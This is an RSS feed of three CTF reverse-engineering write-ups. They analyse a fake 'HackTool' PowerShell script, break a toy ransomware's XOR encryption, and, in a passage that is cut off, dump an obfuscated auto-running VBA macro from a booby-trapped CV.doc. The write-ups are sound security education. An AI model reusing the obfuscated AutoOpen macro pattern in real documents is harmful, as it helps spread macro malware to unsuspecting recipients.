<?xml version="1.0" encoding="utf-8" standalone="yes"?><rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom"><channel><title>reverse on Nicolas Bourras</title><link>https://nicolasb.fr/tags/reverse/</link><description>Recent content in reverse on Nicolas Bourras</description><generator>Hugo -- gohugo.io</generator><language>en-us</language><lastBuildDate>Sun, 11 Jul 2021 06:57:09 +0100</lastBuildDate><atom:link href="https://nicolasb.fr/tags/reverse/index.xml" rel="self" type="application/rss+xml"/><item><title>Writeup Cyber Threat Force : Trojan tools</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-trojan-tools/</link><pubDate>Sun, 11 Jul 2021 06:57:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-trojan-tools/</guid><description>For this challenge, we were given a TROJAN_TOOLS.exe file. Before manually analyzing it, I tried feeding it to hybrid analysis.
Here is the link to the full report.
The &amp;ldquo;Interesting strings&amp;rdquo; section contained the flag: CYBERTF{Y0u_H4s_P3wn_Th3_H4ck_T0ol}.
We can also try to solve the challenge in a more conventional way. Executing the application gives us:
C:\Users\IEUser\Desktop&amp;gt;original.exe Please enter the good PIN Using a process monitor We can use procmon from the Sysinternals suite to monitor the process.</description><content>&lt;p>For this challenge, we were given a &lt;code>TROJAN_TOOLS.exe&lt;/code> file. Before manually analyzing it, I tried feeding it to &lt;a href="https://www.hybrid-analysis.com/">hybrid analysis&lt;/a>.&lt;/p>
&lt;p>Here is the link to &lt;a href="https://www.hybrid-analysis.com/sample/fe5b78b039a6800a2ae00db12559e971cc0a02caa72e29826d3e51ce88eb153b/60e02fcf19a4185d8f58ead3">the full report&lt;/a>.&lt;/p>
&lt;p>The &amp;ldquo;Interesting strings&amp;rdquo; section contained the flag: &lt;code>CYBERTF{Y0u_H4s_P3wn_Th3_H4ck_T0ol}&lt;/code>.&lt;/p>
&lt;hr>
&lt;p>We can also try to solve the challenge in a more conventional way. Executing the application gives us:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ps" data-lang="ps">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">C:\Users\IEUser\Desktop&lt;/span>&amp;gt;&lt;span style="color:#a6e22e">original.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">Please&lt;/span> &lt;span style="color:#a6e22e">enter&lt;/span> &lt;span style="color:#a6e22e">the&lt;/span> &lt;span style="color:#a6e22e">good&lt;/span> &lt;span style="color:#a6e22e">PIN&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="using-a-process-monitor">Using a process monitor&lt;/h2>
&lt;p>We can use &lt;a href="https://docs.microsoft.com/en-us/sysinternals/downloads/procmon">procmon&lt;/a> from the Sysinternals suite to monitor the process.&lt;/p>
&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/reverse-trojan-tools.png" alt="Procmon monitoring for the executable showing a WriteFile call" class="center" />
&lt;p>We can see that a file is created and written to. It is deleted once the executable is done running, but there probably is a call to &lt;code>Sleep&lt;/code> because we can open it in notepad if we&amp;rsquo;re fast enough.&lt;/p>
&lt;p>Here is is, containing the flag:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-powershell" data-lang="powershell">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">Param&lt;/span>($choix)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span>($choix &lt;span style="color:#f92672">-eq&lt;/span> 5383)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write-Host &lt;span style="color:#e6db74">&amp;#34;Welcome to HackTool &lt;/span>&lt;span style="color:#ae81ff">`r`n`r`n`r`n&lt;/span>&lt;span style="color:#e6db74">===MENU===&lt;/span>&lt;span style="color:#ae81ff">`r`n&lt;/span>&lt;span style="color:#e6db74">1)FUD PAYLOAD&lt;/span>&lt;span style="color:#ae81ff">`r`n&lt;/span>&lt;span style="color:#e6db74">2)DDOS&lt;/span>&lt;span style="color:#ae81ff">`r`n&lt;/span>&lt;span style="color:#e6db74">3)Personnal note&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $userChoice = Read-Host &lt;span style="color:#e6db74">&amp;#34;Enter your choice : &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span>($userChoice &lt;span style="color:#f92672">-eq&lt;/span> 1)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $trojanPath = Read-Host &lt;span style="color:#e6db74">&amp;#34;Enter path of payload : &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write-Host &lt;span style="color:#e6db74">&amp;#34;Obfuscating in progress...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write-Host &lt;span style="color:#e6db74">&amp;#34;The payload $trojanPath is now obufscated !&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write-Error &lt;span style="color:#e6db74">&amp;#34;CRITICAL ERROR, IMPOSSIBLE TO OBFUSCATING PAYLOAD&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">ElseIf&lt;/span> ($userChoice &lt;span style="color:#f92672">-eq&lt;/span> 2)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $ipToAttack = Read-Host &lt;span style="color:#e6db74">&amp;#34;Enter IP to Ddos : &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> $portToAttack = Read-Host &lt;span style="color:#e6db74">&amp;#34;Enter port of target : &amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write-Host &lt;span style="color:#e6db74">&amp;#34;ATTACK STARTED to $ipToAttack : $portToAttack&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write-Host &lt;span style="color:#e6db74">&amp;#34;500 requests sended...&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write-Error &lt;span style="color:#e6db74">&amp;#34;CRITICAL ERROR, IMPOSSIBLE TO SEND PACKET&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">ElseIF&lt;/span> ($userChoice &lt;span style="color:#f92672">-eq&lt;/span> 3)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write-Error &lt;span style="color:#e6db74">&amp;#34;ERROR, OPTION 3 IS NOT INCORPORED PLEASE TRY 1 BETWEEN 10&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">ElseIF&lt;/span> ($userChoice &lt;span style="color:#f92672">-eq&lt;/span> 8)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write-Host &lt;span style="color:#e6db74">&amp;#34;CYBERTF{Y0u_H4s_P3wn_Th3_H4ck_T0ol}&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">Else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> {
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write-Error &lt;span style="color:#e6db74">&amp;#34;ERROR, OPTION $userChoice IS NOT INCORPORED PLEASE TRY 1 BETWEEN 10&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> }
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">else&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>{
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> Write-Host &lt;span style="color:#e6db74">&amp;#34;Please enter the good PIN&amp;#34;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>}
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;h2 id="unpacking-the-executable">Unpacking the executable&lt;/h2>
&lt;p>I also noticed that the application was packed using &lt;a href="https://upx.github.io/">UPX&lt;/a>, and that when unpacked, it
contained the string &lt;code>inflate 1.2.8 Copyright 1995-2013 Mark Adler&lt;/code>. This probably indicates nested zlib data. I couldn&amp;rsquo;t find a way to extract anything else though: binwalk gives files that are almost fully filled with null bytes. And &lt;a href="https://github.com/horsicq/Detect-It-Easy">Detect It Easy&lt;/a> doesn&amp;rsquo;t help either.&lt;/p>
&lt;h2 id="more">More&lt;/h2>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/trojan-tools">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : Viking crypt</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-viking-crypt/</link><pubDate>Sun, 11 Jul 2021 05:07:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-viking-crypt/</guid><description>For this challenge, we were given a ransomware (VIKING_CRYPT.exe and VIKING_DECRYPT.exe) along with a LOCKER.HTML file and IMPORTANT_NOTE.txt.vkg.
Let&amp;rsquo;s take a look at that encrypted note:
$ file Perso/IMPORTANT_NOTE.txt.vkg Perso/IMPORTANT_NOTE.txt.vkg: ASCII text, with no line terminators $ cat Perso/IMPORTANT_NOTE.txt.vkg 8a9b600b5a745d39cb7c7e7890e816848a9fe77280b42ca0751d150bb849 It doesn&amp;rsquo;t really look like any encryption I know.
We can try to run VIKING_DECRYPT.exe:
As expected, we&amp;rsquo;re asked for a decryption key. Let&amp;rsquo;s encrypt a few files in a VM, and compare the plaintext and the .</description><content>&lt;p>For this challenge, we were given a ransomware (&lt;code>VIKING_CRYPT.exe&lt;/code> and &lt;code>VIKING_DECRYPT.exe&lt;/code>) along with a &lt;code>LOCKER.HTML&lt;/code> file and &lt;code>IMPORTANT_NOTE.txt.vkg&lt;/code>.&lt;/p>
&lt;p>&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/viking-locker.png" alt="Viking locker ransom message">&lt;/p>
&lt;p>Let&amp;rsquo;s take a look at that encrypted note:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ file Perso/IMPORTANT_NOTE.txt.vkg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>Perso/IMPORTANT_NOTE.txt.vkg: ASCII text, with no line terminators
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cat Perso/IMPORTANT_NOTE.txt.vkg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>8a9b600b5a745d39cb7c7e7890e816848a9fe77280b42ca0751d150bb849
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>It doesn&amp;rsquo;t really look like any encryption I know.&lt;/p>
&lt;p>We can try to run &lt;code>VIKING_DECRYPT.exe&lt;/code>:&lt;/p>
&lt;img src="https://nicolasb.fr/assets/cyber-threat-force/viking-locker-decrypt.png" alt="Viking locker decrypt executable" class="center" />
&lt;p>As expected, we&amp;rsquo;re asked for a decryption key. Let&amp;rsquo;s encrypt a few files in a VM, and compare the plaintext and the &lt;code>.vkg&lt;/code> files.&lt;/p>
&lt;p>Note: the challenge description tells us that, for safety, the malware will only encrypt files in &lt;code>C:\Users\nMnHkfcWUjE\Desktop\Perso&lt;/code>.&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#39;hello world&amp;#39;&lt;/span> &amp;gt; normal.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#39;h3110 w0r1d&amp;#39;&lt;/span> &amp;gt; leet.txt
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-ps" data-lang="ps">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#a6e22e">PS&lt;/span> &lt;span style="color:#a6e22e">C:\Users\nMnHkfcWUjE\Desktop&lt;/span>&amp;gt; &lt;span style="color:#a6e22e">.\VIKING_CRYPT.exe&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ cat normal.txt.vkg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>a1a74e2267006c2df04f5e
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cat leet.txt.vkg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>a1f1137f38006c72f0125e
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Now this is promising. The matching &lt;code>h&lt;/code> has the same value. Let&amp;rsquo;s try a simple xor between the plaintext and the encrypted value, to see if we get a matching key:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> &lt;span style="color:#f92672">import&lt;/span> codecs
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> print([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;hello world&amp;#39;&lt;/span>, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;a1a74e2267006c2df04f5e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[&lt;span style="color:#ae81ff">201&lt;/span>, &lt;span style="color:#ae81ff">194&lt;/span>, &lt;span style="color:#ae81ff">34&lt;/span>, &lt;span style="color:#ae81ff">78&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#ae81ff">32&lt;/span>, &lt;span style="color:#ae81ff">27&lt;/span>, &lt;span style="color:#ae81ff">66&lt;/span>, &lt;span style="color:#ae81ff">130&lt;/span>, &lt;span style="color:#ae81ff">35&lt;/span>, &lt;span style="color:#ae81ff">58&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> print([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h3110 w0r1d&amp;#39;&lt;/span>, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;a1f1137f38006c72f0125e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>[&lt;span style="color:#ae81ff">201&lt;/span>, &lt;span style="color:#ae81ff">194&lt;/span>, &lt;span style="color:#ae81ff">34&lt;/span>, &lt;span style="color:#ae81ff">78&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#ae81ff">32&lt;/span>, &lt;span style="color:#ae81ff">27&lt;/span>, &lt;span style="color:#ae81ff">66&lt;/span>, &lt;span style="color:#ae81ff">130&lt;/span>, &lt;span style="color:#ae81ff">35&lt;/span>, &lt;span style="color:#ae81ff">58&lt;/span>]
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>The key is exactly the same! Let&amp;rsquo;s try decrypting our important note:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> key &lt;span style="color:#f92672">=&lt;/span> [a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;h3110 w0r1d&amp;#39;&lt;/span>, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;a1f1137f38006c72f0125e&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> print(bytes([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(key, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;8a9b600b5a745d39cb7c7e7890e816848a9fe77280b42ca0751d150bb849&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;CYBERTF{I_D&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Well that&amp;rsquo;s only the start of the flag. Let&amp;rsquo;s encrypt something longer, to get more bytes of the key:&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ echo &lt;span style="color:#e6db74">&amp;#39;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non enim quam. Morbi luctus tortor dolor, sed pellentesque urna vestibulum eget. In egestas diam tempus risus molestie, id consectetur ante euismod. Integer eget erat sapien.&amp;#39;&lt;/span> &amp;gt; long.txt
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ &lt;span style="color:#75715e"># Run VIKING_CRYPT.exe&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ cat long.txt.vkg
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>85ad502b65007232f15657689af325bbccc6cb4f9ca7129f24074a1bb65bc8c30162703e3f36149f38c754567af424eb60682eda379edab1b7fe5b44c4df29c471f802c8d8716192291c829b89c3c49695ec48abf2f3721e5b229a20afb2b7c751779c51ff63f378a7a53c27113b306c26fc2b87562768cc82b70cfdbd3fc93730f890234ac890c6e6b9e052f65341eaaf3f7e56d9476c170f17dd5e3830867656c0fd885a68a55ae58bcb182a09ee0a840a03511fb3222d25637b1d344340168dfebdd97a8bc327a36e6d9703f9e6427e9dfd07df86f0140a067a3a843aeef6f4782df2f1e56e380957c2
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> cleartext &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;Lorem ipsum dolor sit amet, consectetur adipiscing elit. Sed non enim quam. Morbi luctus tortor dolor, sed pellentesque urna vestibulum eget. In egestas diam tempus risus molestie, id consectetur ante euismod. Integer eget erat sapien.&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> cipher &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#e6db74">&amp;#39;85ad502b65007232f15657689af325bbccc6cb4f9ca7129f24074a1bb65bc8c30162703e3f36149f38c754567af424eb60682eda379edab1b7fe5b44c4df29c471f802c8d8716192291c829b89c3c49695ec48abf2f3721e5b229a20afb2b7c751779c51ff63f378a7a53c27113b306c26fc2b87562768cc82b70cfdbd3fc93730f890234ac890c6e6b9e052f65341eaaf3f7e56d9476c170f17dd5e3830867656c0fd885a68a55ae58bcb182a09ee0a840a03511fb3222d25637b1d344340168dfebdd97a8bc327a36e6d9703f9e6427e9dfd07df86f0140a067a3a843aeef6f4782df2f1e56e380957c2&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> key &lt;span style="color:#f92672">=&lt;/span> [a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(cleartext, codecs&lt;span style="color:#f92672">.&lt;/span>decode(cipher, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">&amp;gt;&amp;gt;&amp;gt;&lt;/span> print(bytes([a &lt;span style="color:#f92672">^&lt;/span> b &lt;span style="color:#66d9ef">for&lt;/span> a, b &lt;span style="color:#f92672">in&lt;/span> zip(key, codecs&lt;span style="color:#f92672">.&lt;/span>decode(&lt;span style="color:#e6db74">&amp;#39;8a9b600b5a745d39cb7c7e7890e816848a9fe77280b42ca0751d150bb849&amp;#39;&lt;/span>, &lt;span style="color:#e6db74">&amp;#39;hex&amp;#39;&lt;/span>))]))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#e6db74">b&lt;/span>&lt;span style="color:#e6db74">&amp;#39;CYBERTF&lt;/span>&lt;span style="color:#e6db74">{I_D0nt_P4y_Th3_R4ns0m}&lt;/span>&lt;span style="color:#e6db74">&amp;#39;&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>Here we go, the flag is &lt;code>CYBERTF{I_D0nt_P4y_Th3_R4ns0m}&lt;/code>.&lt;/p>
&lt;p>By the way, the key doesn&amp;rsquo;t seem to repeat (at least for the first 235 values), so it&amp;rsquo;s probably made from a RNG.&lt;/p>
&lt;p>You can &lt;a href="https://github.com/vivescere/ctf/tree/main/cyber-threat-force-2021/reverse/viking-crypt">view the sources on github&lt;/a> or &lt;a href="https://nicolasb.fr/blog/cyber-threat-force-ctf/">read other writeups&lt;/a>.&lt;/p></content></item><item><title>Writeup Cyber Threat Force : The document is strange</title><link>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-the-document-is-strange/</link><pubDate>Sat, 10 Jul 2021 17:45:09 +0100</pubDate><guid>https://nicolasb.fr/blog/writeup-cyber-threat-force-2021-reverse-the-document-is-strange/</guid><description>&lt;p>For this challenge, we were given a &lt;code>CV.doc&lt;/code> document. Opening it reveals a pretty normal looking resume template, and a warning about macros from LibreOffice.&lt;/p>
&lt;p>Using the macros menu, we can dump their code:&lt;/p></description><content>&lt;p>For this challenge, we were given a &lt;code>CV.doc&lt;/code> document. Opening it reveals a pretty normal looking resume template, and a warning about macros from LibreOffice.&lt;/p>
&lt;p>Using the macros menu, we can dump their code:&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-vba" data-lang="vba">Rem Attribute VBA_ModuleType=VBAModule
Option VBASupport 1
Private Declare PtrSafe Function Sleep Lib &amp;#34;KERNEL32&amp;#34; (ByVal mili As Long) As Long
Private Function xDSnawULVynR(lyOFjkCBqpsZ As Variant, gGuJOMcorXqH As Variant)
Dim ZtYIpNgiqDdm As String
ZtYIpNgiqDdm = &amp;#34;&amp;#34;
For i = LBound(lyOFjkCBqpsZ) To UBound(lyOFjkCBqpsZ)
ZtYIpNgiqDdm = ZtYIpNgiqDdm &amp;amp; Chr(gGuJOMcorXqH(i) Xor lyOFjkCBqpsZ(i))
Next
xDSnawULVynR = ZtYIpNgiqDdm
End Function
Sub IAjgEYdgKhtjY()
fVKsxPMRAauvNsO
End Sub
Sub AutoOpen()
fVKsxPMRAauvNsO
End Sub
Sub fVKsxPMRAauvNsO()
Sleep (((2063 - 354) + (554 - 263)))
LwvYeveWxaeE
zrOxbjsXpxFIZ
XEFxqSzaXCXvSAp
End Sub
Sub LwvYeveWxaeE()
Dim vboXZZvyMJBot As String
Dim hfBGMlrCyHeaK As String
Dim dWlVcYnsGQco As String
Dim EdVSmtRqwXYTGM As String
Dim yyEWNYbuXurxW As String
Dim MwIMnegwljrXk As String
vboXZZvyMJBot = xDSnawULVynR(Array(229, (397 - 156), (29 + 138), 179, 26, (6 - 0), (297 - 93), 9, 187, ((146 - 17) Xor (20 - 1)), (125 + (101 - 31)), 46, 72, 196, (53 Xor 190)), Array(175, (161 Xor 17), ((225 - 24) + 28), (141 + 85), ((133 - 47) + 5), (103 - 25), ((115 - 32) Xor 214), (69 Xor 13), (138 + (116 - 37)), (190 + 39), (34 Xor (256 - 93)), ((71 - 28) Xor (57 + 54)), (2 + 7), (74 Xor 203), (52 + 139))) &amp;amp; _
xDSnawULVynR(Array(((209 - 92) + 121), ((112 - 55) Xor 76), 148, 89, 12, ((7 - 1) + (30 - 4)), ((4 - 0) + 4), ((52 + 168) Xor (108 - 50)), ((0 - 0) Xor 9), (8 Xor 111), (1 Xor ((30 - 9) + 14)), 69, 184, 230, ((18 - 3) + 144)), Array(((111 - 37) Xor 229), 44, 197, (47 - 20), (198 - 78), ((123 - 52) Xor (4 + 34)), 79, 179, 72, (15 + (53 - 22)), (124 - 25), (8 - 4), 129, 167, (((97 - 25) + (7 - 2)) Xor (88 + 57)))) &amp;amp; _
xDSnawULVynR(Array((20 Xor (89 - 26)), (((13 - 4) + 125) Xor 109), 175, (397 - 174), (43 - 7), 221, 79, (13 Xor 49), (97 Xor (209 - 40)), ((38 + 135) Xor (39 + 66)), 66, (203 - 75), (236 Xor (12 + 4)), (40 + 181), 147), Array((175 - 69), 170, ((281 - 106) + 55), 184, ((103 - 43) Xor (1 + 89)), ((205 - 39) Xor (5 + (13 - 6))), (14 + (0 - 0)), 123, 141, (249 - 116), (((3 - 1) + 1) Xor 37), 193, 190, (71 + (112 - 0)), (40 Xor (62 + 188)))) &amp;amp; _
